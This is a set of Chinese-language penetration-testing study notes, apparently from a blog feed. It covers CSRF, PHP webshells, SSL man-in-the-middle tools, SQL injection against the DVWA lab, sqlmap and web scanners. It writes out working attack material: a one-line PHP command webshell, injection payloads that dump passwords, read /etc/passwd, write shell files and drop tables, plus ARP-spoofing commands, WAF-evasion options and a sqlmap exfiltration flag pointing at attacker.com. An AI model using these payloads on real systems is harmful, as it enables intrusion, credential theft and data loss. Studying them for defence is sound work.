命令模块 绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见 红色模块：表示模块不适用于当前用户，有些红色模块也可正常执行 橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等） 灰色模块：模块未在目标浏览器上测试过 主要模块 Browsers Exploits Host Persistence NetworkCSRF Cross-site request forgery 与XSS经常混淆 从信任的角度来区分 XSS：利用用户对站点的信任 CSRF：利用站点对已经身份认证的信任 结合社工在身份认证会话过程中实现攻击 修改账号密码，个人信息（Email，收货地址） 发送伪造的业务请求（网银，购物，投票） 关注他人的社交账号，推送博文 在用户非自愿，不知情的情况下提交请求 业务逻辑漏洞 对关键操作缺少确认机制 自动扫描程序无法发现此类漏洞 漏洞利用条件 被害用户已经完成身份认证 新请求的提交不需要重新身份认证或确认机制 攻击者必须了解web APP请求的参数构造 诱使用户触发攻击的指令（社工） Burpsuite CSRF PoC generator Post/Get 方法 自动扫描程序的检测方法 在请求和响应过程中检查是否存在anti-CSRF token名 检查服务器是否验证anti-CSRF token的名值 检查token中可编辑的字符串 检查referrer头是否可以伪造 对策 Captcha anti-CSRF token Referrer头 降低会话超时时间 WEBSHELL &lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;_ 中国菜刀 可能被IDS，AV，WAF，扫描器软件发现查杀 WeBaCoo(web backdoor cookie) 类终端的shell 编码通信内容通过cookie头传输，隐蔽性较强 cm:base64编码的命令 cn:服务器用于返回数据的cookie头的名 cp:返回信息定界符 生成服务端 webacoo -g -o a.php 客户端连接 webacoo -t -u http://1.1.1.1/a.php 其他参数 Weevely 隐蔽的类终端PHP webshell 30多个管理模块 执行系统命令，浏览文件系统 检查服务器常见配置错误 创建正向，反向TCP SHELL连接 通过目标计算机代理HTTP流量 从目标计算机运行端口扫描，渗透内网 支持连接密码 生成服务端 weevely generate b.php /usr/share/weevely/b.php 客户端连接服务器 weevely http://1.1.1.1/b.php id HTTPS攻击 全站HTTPS正成为潮流趋势 HTTPS的作用 解决的是信息传输过程中数据被篡改，窃取 加密： 对称，非对称，单项 HTTPS攻击方法 降级攻击 解密攻击（明文，证书伪造） 协议漏洞，实现方法的漏洞，配置不严格 Secure socket layer 保证网络通信安全的加密协议 1994年由Netscape开发成为统一标准 1999年TLS（transport layer security）取代SSL v3 近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复 Heartbleed POODLE BEAST TLS当前最新版本 TLS/SSL HTTPS HTTPS over SSL 通俗上表示同一含义 SSL/TLS也被用于其他场景的传输通道加密 邮件传输（服务器间、客户端与服务器间） 数据库服务器间 LDAP身份认证服务器间 SSL VPN 远程桌面RDP通信过程中的加密和身份认证 web通信中的SSL 公钥证书（受信任的第三方公钥颁发机构签名颁发） VeriSign Thawte GolbalSign Symantec 加密过程 握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输 非对称加密算法 Diffie-Hellman key exchange Rivest Shamir Adleman(RSA) Elliptic Curve Cryptography(ECC) 对称加密算法 Data Encryption Standard(DES) / 3DES Advance Encryption Standard(AES) International Data Encryption Algorithm(IDEA) Rivest Cipher 4(RC4) WEP,TLS/SSL,RDP,Secure shell 单向加密算法（HASH） SHA-3 已经设计完成，但尚未广泛使用 SHA-2 是TLS 1.2 唯一支持的单向加密算法 碰撞攻击针对单向加密算法 两个不同的文件生成相同的HASH值 SSL的弱点 SSL是不同的对称，非对称，单向加密算法的组合加密实现（cipher suite） 服务端为提供更好的兼容性，选择支持大量过时cipher suite 协商过程中强迫降级加密强度 现代处理器计算能力可以在可接受的时间内破解过时加密算法 购买云计算资源破解 Openssl 直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite openssl s_client -connect www.baidu.com:443 openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443 密钥交换-身份认证-数据加密-HASH算法 openssl s_client -tls1_2 -cipher &quot;NULL,EXPORT,LOW,DES&quot; -connect www.taobao.com:443 （协商低安全级别cipher suite） 可被破解的cipher suite openssl ciphers -v “NULL,EXPORT,LOW,DES” https://www.openssl.org/docs/apps/ciphers.html Openssl 需要大量密码学相关知识，命令复杂，结果可读性差 SSLScan 自动识别SSL配置错误、过期协议、过时cipher suite和hash算法 默认会检查crime，heart bleed漏洞 绿色表示安全，红色黄色需要引起注意 TLS支持的cipher suite sslscan --tlsall www.taobao.com:443 分析证书详细信息 sslscan --show-certificate --no-ciphersuites www.taobao.com:443 SSLyze Python语言编写 检查SSL过时版本 检查存在弱点的cipher suite 扫描多站点时，支持来源文件 检查是否支持会话恢复 sslyze --regular www.taobao.com:443 Nmap nmap --script=ssl-enum-ciphers.nse www.taobao.com https://www.ssllabs.com/ssltestSSL 中间人攻击 攻击者位于客户端和服务器通信链路中 ARP DHCP 修改网关 修改DNS 修改HOSTS ICMP,STP,OSPF 加密流量 攻击的前提 客户端已经信任伪造证书颁发机构 攻击者控制了核发证书颁发机构 客户端程序禁止了显示证书错误告警信息 攻击者已经控制客户端，并强制其信任伪造证书 SSLsplit 透明SSL/TLS中间人攻击工具 对客户端伪装成服务器，对服务器伪装成普通客户端 伪装服务器需要伪造证书 支持SSL/TLS加密的SMTP，POP3，FTP等通信中间人攻击 利用openssl生成证书密钥 openssl genrsa -out ca.key 2048 利用私钥签名生成证书 openssl req -new -x509 -days 1096 -key ca.key -out ca.crt 启动路由 sysctl -w net.ipv4.ip_forward=1 Iptables端口转发规则 12345678iptables -t nat -Fiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 #MSAiptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 #SMTPSiptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 #IMAPSiptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 #POP3SIptables -t nat -L ARP欺骗 arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1 启动SSLsplit mkdir -p test/logdir sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 被害者访问taobao,baidu,mail.163.com 查看日志和浏览器证书及证书报错信息 安装服务器跟证书之后再次访问 iptables端口转发规则 123iptables -t nat -Fiptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080 Mitmproxy mitmproxy -T --host -w mitmproxy.log SSLstrip 与前两种工具不同，将客户端到中间人之间的流量变为明文 ssltrip -l 8080 thc-ssl-dos SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务 利用SSL secure renegotiation特性，在单一TCP连接中生成数千个SSL重连请求，造成服务器资源过载 与流量式拒绝服务攻击不同，thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器 服务器平均可以处理300次/秒SSL握手请求 对SMTPS，POP3 等服务同样有效 对策 禁用SSL-Renegotiation ,使用 SSL Accelerator 通过修改thc-ssl-dos代码，可以绕过以上对策 AJAX Asynchronous JavaScript and XML 是一个概念，而非一种新的编程语言，是一组现有技术的组合 通过客户端脚本动态更新页面部分内容，而非整个页面 降低带宽使用，提高速度 提升用户体验 后台异步访问 AJAX组件 JavaScript: ajax的核心组件，使用XMLHTTPRequest 对象接口向服务器发起请求，接收并处理服务器响应数据 Dynamic HTML(DHTML) 早于AJAX出现，通过JavaScript，CSS等在客户端修改HTML页面element，缺点是完全依赖客户端代码修改页面，与服务器的交互由JavaScript applets完成，AJAX的XHR弥补了他的缺点（注册用户） Document Object Model(DOM) 处理html,xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的Properties,method,event 基于AJAX的web应用工作流程 XMLHTTPRequest API 创建对象xmlhttp进行访问 XML，JSON，HTML，文本，图片 多个异步请求独立通信，互不依赖 AJAX框架 JQuery Dojo Toolkit Google web toolkit(GWT) Microsoft AJAX library 目前没有通用的AJAX安全最佳实践，其攻击面不为大多数人所知 AJAX的安全问题 多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程 AJAX引擎是个全功能的脚本解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可被绕过 服务器，客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露 暴露应用程序逻辑 AJAX对渗透测试的挑战 异步请求数量多且隐蔽 触发AJAX请求的条件无规律 手动和截断代理爬网可能产生大量遗漏 AJAX爬网工具 ZAP 客户端代码审计 源码 firebug web Service 面向服务的架构（service oriented architecture) 便于不同系统集成共享数据和功能 尤其适合不想暴露数据模型和程序逻辑而访问数据的场景 无页面 两种类型的web service Simple object access protocol （SOAP） 传统的web service 开发方法，xml是唯一的数据交换格式 要求安全性的应用更多采用 RESTFUL（Representational State Transfer architecture— REST) 目前更多被采用的轻量web service, JSON 是首选数据交换格式 Web Service 安全考虑 使用API key或session token实现和跟踪身份认证 身份认证由服务器完成，而非客户端 API key,用户名，Session token 永远不要通过URL发送 RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全 SOAP 提供强于HTTPS的WS-security机制 使用OAuth 或 HMAC 进行身份认证，HMAC身份认证使用C/S共享的密钥加密API key RESTful应只允许身份认证用户使用PUT，DELETE方法 使用随机token防止CSRF攻击 对用户提交参数过滤，建议部署基于严格白名单的方法 报错消息消毒 直接对象引用应严格身份验证（电商公司以ID作为主索引）]]></content>
  </entry>
  <entry>
    <title><![CDATA[SQL注入笔记]]></title>
    <url>%2F2018%2F04%2F21%2FSQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[SQL注入笔记 服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器 用户登陆判断 12SELECT * FROM users WHERE user=‘uname' AND password=‘pass‘SELECT * FROM users WHERE user=‘name' AND password='' OR ''='‘ 基于报错的检测方法 ‘ “ % ( ) 基于布尔的检测 1’ and ‘1’=‘1 1’ and ‘1’=‘2 表列数/显示信息位于哪一列 ‘ order by 9-- select * 时表字段数=查询字段数 联合查询 ’ union select 1,2--+ ’ union all select database(),2--+ hash-identifier &#39; union select database(),substring_index(USER(),&quot;@&quot;,1)-- DB用户：user() DB版本：version() 全局函数：@@datadir @@hostname @@VERSION @@version_compile_os 当前库：database() ASCII转字符：char() 连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version()) 计算哈希：md5() Mysql数据结构 information_schema 所有库所有表/统计每库中表的数量 ‘ union select table_name,table_schema from information_schema.tables--+ &#39; UNION select table_schema,count(*) FROM information_Schema.tables group by table_schema -- DVWA库中的表名 &#39; union select table_name,table_schema from information_schema.tables where table_schema=&#39;dvwa&#39;--+ Users表中的所有列（user_id, first_name, last_name, user, password, avator) &#39; union select table_name,column_name from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users’--+ 查询user password列的内容 &#39; union select user,password from dvwa.users--+ &#39; union select user,password from users--+ &#39; union select null, concat(user,0x3a,password) from users--+ 密码破解 username:passhash ——&gt; dvwa.txt john --format=raw-MD5 dvwa.txt 读取文件 &#39; union SELECT null, load_file(&#39;/etc/passwd&#39;)--+ 写入文件 &#39; union select null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;/tmp/a.php&quot; --+ Mysql账号 文件包含 ?page=/tmp/a.php&amp;cmd=ls cat php-revers-shell.php | xxd -ps | tr -d &#39;\n&#39; &#39; union select null, (0x3c3f706870) INTO DUMPFILE &#39;/tmp/x.php&#39;-- 保存下载数据库 &#39; union select null, concat(user,0x3a,password) from users INTO OUTFILE &#39;/tmp/a.db&#39;-- 一个思路：编写服务器端代码 12345678910111213141516&apos; union select null,&apos;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID = $_POST[&quot;userID&quot;]; $first_name= $_POST[&quot;first_name&quot;]; $last_name = $_POST[&quot;last_name&quot;]; $username =$_POST[&quot;username&quot;]; $avatar = $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo&quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username:$username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;;$con=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo&quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected todatabase&lt;BR&gt;&quot;; &#125; $password = &quot;123&quot;; $sql=&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\\&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\\&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Errorcreating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method=&quot;post&quot;action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userID&quot;value=&quot;33&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;fh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot;name=&quot;last_name&quot; value=&quot;y&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;yfh&quot;&gt;&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;avatar&quot; value=&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;value=&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;/form&gt;&apos; INTO DUMPFILE &apos;/tmp/user.php&apos; -- 无权读取information_schema库 / 拒绝union, order by 语句 猜列名： &#39; and column is null--+ burpsuite 自动猜列名 猜当前表表名：&#39; and table.user is null--+ 猜库里其他表： &#39; and(select count(*) from table)&gt;0--+ 列表对应关系： &#39; and users.user is null--+ 猜字段内容： &#39; or user = &#39;admin &#39; or user like &#39; %a% 猜账号对应密码： &#39; or user=&#39;admin&#39; and password=&#39;5f4dcc3b5aa765d61d8327deb882cf99 当数据库可写 &#39;; update users set user=&#39;yy&#39; where user=&#39;admin 注入失败，SQL客户端工具的问题 http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html &#39;; INSERT INTO users (&#39; user_id&#39;,&#39; first_name&#39;,&#39; last_name&#39;,&#39;user&#39;,&#39;password&#39;,&#39;avatar&#39;) VALUES(‘35&#39;,&#39;yy&#39;,‘y&#39;,‘yyy&#39;,&#39;5f4dcc3b5aa765d61d8327deb882cf99&#39;,&#39;OK&#39;);--+ &#39;;DROP TABLE users;-- SQLi没有通用的方法，掌握原理，了解各种数据库特性 Medium难度级别 mysql_real_escape_string() PHP 4 &gt;= 4.3.0 PHP 5 PHP5.5.0已经弃用此函数 PHP7.0.0 已经删除此函数，代之以mysqli,PDO_MySQL High级别 mysql_real_escape_string() stripslashes() is_numeric() SQL盲注 不显示数据库内建的报错信息 内建的报错信息帮助开发人员发现和修复问题 报错信息提供关于系统的大量有用信息 当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，SQL注入将无法依据报错信息判断注入语句的执行结果。 思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断 1 &#39; and 1 = 1--+ 1 &#39; and 1=2--+ 123451&apos; union select 1,2--+1&apos; union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())--+1&apos; and 1=0 union select null,table_name from information_schema.tables#1&apos; and 1=0 union select null,table_name from information_schema.columns wheretable_name=&apos;users&apos; # 无权读取information_schema库 / 拒绝 union \ order by 语句 猜列名： 1&#39; and user is not null--+ 猜当前表表名： 1&#39; and table.user is not null--+ 猜库里其他表：1&#39; and (select count() from table)&gt;0--+ 列表对应关系：1&#39; and users.user is not null--+ 猜字段内容： 1&#39; and user=&#39;admin 1&#39; or user like &#39;%a% 猜账号对应密码：2&#39; or user=&#39;admin&#39; and password=&#39;5f4dcc3b5aa765d61d8327deb882cf99 开个脑洞 12341&apos; and ORD(MID((VERSION()),1,1))&amp;1&gt;0--+CURRENT_USER()?DATABASE()MID(ColumnName, Start [, Length])ORD(string) #ASCII? SQLMAP 自动注入 开源sql注入漏洞检测，利用工具 检测动态页面中get/post参数，cookie, http头 数据榨取 文件系统访问 操作系统命令执行 引擎强大，特性丰富 XSS漏洞检测 五种漏洞检测技术 基于布尔的盲注检测 基于时间的盲注检测 基于错误的检测 基于UNION联合查询的检测 适用于通过循环直接输出联合查询结果，否则只显示第一项结果 基于堆叠查询的检测 堆叠多个查询语句 适用于非select的数据修改，删除的操作 支持的数据库管理系统DBMS MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite,Firebird, Sybase , SAP MaxDB 其他特性 数据库直接连接-d 不通过SQL注入，指定身份认证信息，IP，端口 与Burpsuite google联合使用，支持正则表达式限定测试目标 GET POST cookie referer User-Agent （随机或指定） cookie过期后自动处理set-cookie头，更新cookie信息 限速：最大并发、延迟发送 支持Basic Digest NTLM CA身份认证 数据库版本，用户，权限，hash枚举和字典破解，暴力破解表列名称 文件上传下载，UDF，启动并执行存储过程，操作系统命令执行，访问Windows注册表 与w3af,metasploit集成结合使用，基于数据库服务进程提权和上传执行后门 sqlmap -h / -hh sqlmap -d &quot;mysql://user:password@192.168.20.10:3306/dvwa&quot; -f --users --banner --dbs --schema -a sqlmap --version -v 日志 .sqlmap 输出 输出内容详细度分7个等级 GET方法 sqlmap -u &quot;http://192.168.20.10/mutillidae/index.php?page=user-info.php&amp;username=11&amp;password=22&amp;user-info-php-submit-button=View+Account+Details&quot; -p username -f 扫描URL列表文件 sqlmap -m list.txt 扫描Google搜索结果 sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot; POST方法 使用Http请求文件（burpsuite) sqlmap -r request.txt 使用burpsuite log 文件 sqlmap -l log.txt HTTPS sqlmap -u “https://1.1.1.1/a.php?id=1:8843” --force-ssl 扫描配置文件 sqlmap -c sqlmap.conf 数据段：–data get/post 都适用 sqlmap -u &quot;http://1.1.1.1/a.php&quot; --data=&quot;user=1&amp;pass=2&quot; -f 变量分隔符：–param-del http://1.1.1.1/a.php?q=foo;id=1 // ; &amp; sqlmap -u &quot;http://1.1.1.1/a.php&quot; --data=&quot;q=foo;id=1&quot; --param-del=&quot;;&quot; -f cookie头： –cookie web应用需要基于cookie的身份认证 检查cookie中的注入点（level &gt;=2) Set-Cookie / --drop-set-cookie / --cookie-del sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --cookie=&quot;a=1;b=2&quot; -f –user-agent sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org –random-agent /usr/share/sqlmap/txt/user-agents.txt sqlmap检查user-agent中的注入点：level&gt;=3 APP/WAF/IPS/IDS 过滤异常user-agent时报错 Host头： –host level=5 referer头： –referer level&gt;=3 额外的header：–headers 每个头单独一行（名称区分大小写） –method= GET/POST 基于HTTP协议的身份认证 basic digest NTLM sqlmap. -u &quot;http://1.1.1.1/a.php?id=1&quot; --auth-type Basic --auth-cred &quot;user:pass –auth-cert / –auth-file –auth-file = “ca.PEM” 含有私钥的PEM格式证书文件 PEM格式的证书链文件 Http(s)代理 --proxy=&quot;http://127.0.0.1:8087&quot; --proxy-cred=&quot;name:pass&quot; --ignore-proxy 忽略系统级代理设置，通常用于扫描本地网络目标 –delay 每次https请求之间延迟时间，浮点数，单位为秒，默认无延迟 –timeout 请求超时时间，浮点数，默认为30秒 –retries http(s)连接超时重试次数，默认3次 –randomize 长度，类型与原始值保持一致的前提下，指定每次请求随机取值的参数名 –scope 过滤日志内容，通过正则表达式筛选扫描对象 sqlmap -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)“ sqlmap -l 2.log --scope=&quot;(19)?\.168\.20\.(1|10|100)&quot; --level 3 --dbs –safe-url / –safe-freq 检测和盲注阶段会产生大量失败请求，服务器端可能因此销毁session 每发送–safe-freq次注入请求后，发送一次正常请求 –skip-urlencode 默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据 –eval 每次请求前执行指定的python代码 每次请求更改或增加新的参数值（时间依赖，其他参数值依赖） sqlmap -u &quot;http://1.1.1.1/a.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot; 优化性能 –predict-output 根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率 版本名，用户名，密码，privileges，role，数据库名称，表名，列名 与–threads参数不兼容 统计表：/usr/share/sqlmap/txt/common-outputs.txt –keep-alive 使用http 长连接，性能好 与–proxy参数不兼容 长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源 –null-connection 只获取相应页面的大小值，而非页面具体内容 通常用于盲注判断 真/假， 降低网络带宽消耗 与–text-only参数不兼容（基于页面内容的比较判断真/假） –threads 最大并发线程 盲注时每个线程获取一个字符（7次请求），获取完成后线程结束 默认值为1，建议不要超过10，否则可能影响站点可用性 与 –predict-output参数不兼容 -o 开启前三个性能参数（除–threads参数） -p 指定扫描的参数，使–level失效 -p “user-agent, referer” –skip 排除指定的扫描参数 --level=5 --skip=&quot;id,user-agent&quot; uri注入点 sqlmap -u “http://targeturl/param1/value1*/param2/value2*/&quot; --dbms=&quot;mysql&quot; --os --invalid-bignum / --invalid-logical 通常sqlmap使用负值使参数取值失效 bignum使用大数使参数值失效 Logical使用布尔判断使取值失效 –no-cast 榨取数据时，sqlmap将所有结果转换为字符串，并用空格替换NULL结果 老版本mysql数据库需要开启此开关 –no-escape 出于混淆和避免出错的目的，payload中用单引号界定字符串时，sqlmap使用char()编码逃逸的方法替换字符串 SELECT &#39;foo&#39; ? SELECT CHAR(102)+CHAR(111)+CHAR(111) 本参数将关闭此功能 –prefix / –suffix $query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;; sqlmap -u &quot;http://1.1.1.1/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id--prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc“ query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND(’abc’=’abc’) LIMIT 0, 1&quot;; –tamper 混淆脚本，用于绕过应用层过滤，IPS，WAF sqlmap -u “http://1.1.1.1/a.php?id=1” --tamper=&quot;tamper/between.py,tamper/randomcase.py,tamper/space2comment.py&quot; -v 3 –level 1-5级 /usr/share/sqlmap/xml/payloads –risk risk升高可造成数据被篡改等风险 –string –not-string –regexp –code –text-only –titles 页面比较，基于布尔的注入检测，依据返回页面内容的变化判断真假逻辑，但有些页面随时间阈值变化，此时需要人为指定标识真假的字符串 默认使用全部技术 B: Boolean-based blindE: Error-basedU: Union query-basedS: Stacked queriesT: Time-based blind –time-sec 基于时间的注入检测相应延迟时间 –union-cols 默认联合查询1-10列，随–level增加最多支持50列 –union-cols 6-9 –union-char 联合查询默认使用NULL，极端情况下NULL可能失败，此时可以手动指定数值 –union-char 123 –dns-domain 攻击者控制了某DNS服务器，使用此功能可以提高数据榨取的速度 –dns-domain attacker.com –second-order 在一个页面注入的结果，从另一个页面体现出来 –second-order http://1.1.1.1/b.php -f, –fingerprint, -b , –banner 数据库管理系统指纹信息 DBMS，操作系统，架构，补丁 ENUMERATION 123456789101112131415--current-user--current-db--hostname--users--privileges -U username --roles--dbs--tables, --exclude-sysdbs –D dvwa-T users -D dvwa -C user --columns--schema --batch --exclude-sysdbs 元数据（使用默认选项）--countDump数据--dump, -C, -T, -D, --start, --stop--dump-all --exclude-sysdbs--sql-query &quot;select * from users&quot; BRUTE FORCE MySQL &lt; 5.0 没有information_schema 库 MySQL &gt;= 5.0 但无权读取information_schema库 微软的access数据库 ，默认无权读取MSysObjects库 –common-tables –common-columns –udf-inject ,–shared-lib http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857 –file-read = “/etc/password” –file-write=”shell.php” –file-dest “/tmp/shell.php” MySQL，postgresql 上传共享库并生成sys_exec(),sys_eval()两个UDF mssql xp_cmdshell存储过程 Windows registory 1234567--reg-read--reg-add--reg-del--reg-key?--reg-value?--reg-data?--reg-typesqlmap –u=&quot;http://1.1.1.1/a.aspx?id=1&quot; --reg-add --reg-key=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 -s : sqlite会话文件保存位置 -t: 记录流量文件保存位置 –charset:强制字符编码 –crawl：从起始位置爬站深度 –csv-del：dump数据默认存于“，”分割的csv文件中，指定其他分隔符 –dbms-cred：指定数据库账号 –flush-session：清空session –force-ssl –fresh-queries:忽略session查询结果 –hex:dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原 –output-dir=/tmp –parse-errors:分析和显示数据库内建报错信息 –save:将命令保存成配置文件 MISCELLANEOUS 12345678-z 参数注记符sqlmap --batch --random-agent --ignore-proxy --technique=BEU -u“1.1.1.1/a.php?id=1&quot;sqlmap -z &quot;bat,randoma,ign,tec=BEU&quot; -u “1.1.1.1/a.php?id=1&quot;sqlmap --ignore-proxy --flush-session --technique=U --dump -D testdb -Tusers -u “1.1.1.1/a.php?id=1&quot;sqlmap -z &quot;ign,flu,bat,tec=U,dump,D=testdb,T=users&quot; -u “1.1.1.1/vuln.php?id=1“ –answer –check-waf: 检测WAF/IPS/IDS –hpp: HTTP parameter pollution 绕过WAF/IPS/IDS的有效方法 尤其对ASP/IIS 和 ASP.NET/IIS –identify-waf：彻底的WAF/IPS/IDS检查 –mobile: 模拟智能手机设备 –purge-output：清除output文件夹 –smart：当有大量检测目标时，只选择基于错误的检测结果 –wizard]]></content>
  </entry>
  <entry>
    <title><![CDATA[Web扫描工具]]></title>
    <url>%2F2018%2F04%2F07%2FWeb%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[WEB渗透Web技术发展 静态Web 动态Web 应用程序 数据库 每人看到的内容不同 根据用户输入返回不同结果 Web攻击类型有数百种 Web攻击面 Network OS Web Server App Server Web Application Database Browser HTTP协议基础 明文 无内建的机密性安全机制 嗅探或代理截断可查看全部明文信息 https只能提高传输层安全 无状态 每一次客户端和服务器端的通信都是独立的过程 Web应用需要跟踪客户端会话（多步通信） 不使用cookie的应用，客户端每次请求都要重新身份验证 Session用于在用户身份验证后跟踪用户行为轨迹 提高用户体验，但增加了攻击向量 Cycle 请求/响应 重要的Header Set-Cookie: 服务器发给客户端的SessionID（被窃取的风险） Content-Length: 响应body部分的字节长度 Location：重定向用户到另一个页面，可识别身份认证后允许访问的页面 Cookie：客户端发回给服务器证明用户状态的信息（头：值成对出现） Referrer: 发起新请求之前用户位于哪个页面，服务器基于此头的安全限制很容易被修改绕过 状态码 服务端响应的状态码表示响应的结果类型（5大类50多个具体响应码） 100s:服务器响应的信息，通常表示服务器还有后续处理，很少出现 200s:请求被服务器成功接受并处理后返回的响应结果 300s: 重定向，通常在身份认证成功后重定向到一个安全页面（301/302） 400s: 表示客户端请求错误 401：需要身份验证 403：拒绝访问 404：目标未发现 500s: 服务器内部错误（503：服务不可用） http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html 实验环境 Metasploitable DVWA 侦察 Httrack 减少与目标系统交互 扫描工具Nikto Vega Skipfish W3af Arachni Owasp-zap nikto Perl语言开发的开源web安全扫描器 软件版本 搜索存在安全隐患的文件 服务器配置漏洞 web Application 层面的安全隐患 避免404误判 很多服务器不遵守RFC标准，对于不存在的对象返回200响应码 依据响应文件内容判断，不同扩展名的文件404响应内容不同 去除时间信息后的内容取MD5值 -no404(参数) nikto -list-plugins nikto -update升级插件 nikto -host http://1.1.1.1 nikto -host 192.168.1.1 -ssl -port 443,8443,995 nikto -host host.txt nmap -p80 192.168.1.0/24 -oG - | nikto -host - nikto -host 192.168.1.1 -useproxy http://localhost:8087 -vhost Nikto-interactive Space - report current scan status v - verbose mode on/off d - debug mode on/off e - error reporting on/off p - progress reporting on/off r - redirect display on/off c - cookie display on/off a - auth display on/off q -quit N - next host P - Pause 配置文件 /etc/nikto.conf STATIC-COOKIE=&quot;cookie1&quot;=&quot;cookie value&quot;;&quot;cookie2&quot;=&quot;cookie valu” evasion: 使用LibWhisker中对IDS的躲避技术，可使用以下几种类型 1 随机URL编码（非UTF-8方式） 2 自选择路径 3 过早结束的URL 4 优先考虑长随机字符串 5 参数欺骗 6 使用TAB作为命令的分隔符 7 使用变化的URL 8 使用Windows路径分隔符“\“ Vega JAVA编写的开源Web扫描器 扫描模式 代理模式 爬站、处理表单、注入测试 支持SSL：http://vega/ca.crt skipfish C语言编写 实验性的主动web安全评估工具 递归爬网 基于字典的探测 速度较快 多路单线程，全异步网络I/O，消除内存管理和调度开销 启发式自动内容识别 误报较低 skipfish -o test http://1.1.1.1 skipfish -o test @url.txt skipfish -o test -S complet.wl -W a.wl http://1.1.1.1 #字典 -I : 只检查包含string的URL -X: 不检查包含string 的URL -K: 不对指定参数进行Fuzz测试 -D: 跨站点爬另外一个域 -l: 每秒最大请求数 -m: 每IP最大并发连接数 --config: 指定配置文件 身份认证 skipfish -A user:pass -o test http://1.1.1.1 skipfish -C &quot;name=val&quot; -o test http://1.1.1.1 Username / 